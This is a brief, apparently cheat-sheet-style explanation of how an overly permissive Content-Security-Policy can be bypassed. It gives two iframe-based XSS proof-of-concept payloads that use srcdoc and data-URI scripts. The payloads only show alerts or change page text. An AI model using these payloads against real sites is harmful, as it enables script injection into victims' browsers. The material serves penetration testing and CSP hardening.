Attackers can use `<iframe>` to bypass the below CSP policy.
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self' data: *; connect-src 'self'; script-src 'self'">
```
```http
HTTP/1.1 200 OK
...
Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src 'self';
```

An iframe from the whitelisted domain must be allowed by the application in order to perform the bypass. An XSS attack can be easily facilitated by using the [srcdoc](https://www.w3schools.com/tags/att_iframe_srcdoc.asp) attribute of the iframe.

The following XSS payloads can then be used:
```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```
```html
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```